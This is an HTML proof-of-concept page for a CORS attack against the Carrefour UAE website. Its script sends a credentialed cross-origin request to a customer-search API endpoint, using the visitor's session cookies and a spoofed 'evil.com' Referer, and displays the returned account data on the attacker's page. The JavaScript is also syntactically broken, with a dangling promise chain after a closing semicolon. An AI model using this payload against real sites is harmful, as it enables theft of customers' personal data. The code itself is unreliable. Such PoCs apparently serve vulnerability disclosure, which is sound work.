<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Carrefour UAE - Get Store Key PoC</title>
  <style>
    body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
    button { padding: 10px 15px; font-size: 16px; cursor: pointer; }
    pre { background: #fff; padding: 15px; border: 1px solid #ccc; white-space: pre-wrap; max-height: 500px; overflow: auto; }
  </style>
</head>
<body>
  <h2>üö® CORS PoC ‚Äì Get Store Key</h2>
  <button onclick="fetchStoreKey()">Fetch Store Key</button>
  <pre id="output">Click the button above to fetch response from target API.</pre>

  <script>
    function fetchStoreKey() {
      document.getElementById("output").textContent = "‚è≥ Fetching...";

      fetch("https://www.carrefouruae.com/v2/customers/channel/search?email=fohof13749%40modirosa.com", {
  method: "GET",
  headers: {
    "Appid": "Reactweb",
    "Env": "prod",
    "Lang": "en",
    "Langcode": "en",
    "Referer": "https://evil.com",  // Can be arbitrary
  },
  credentials: "include", // Required if cookies/session tokens needed
  mode: "cors"
})
.then(res => res.text())
.then(console.log)
.catch(console.error);

      .then(response => response.text())
      .then(data => {
        document.getElementById("output").textContent = data;
      })
      .catch(error => {
        document.getElementById("output").textContent = "‚ùå Request failed:\n" + error;
      });
    }
  </script>
</body>
</html>
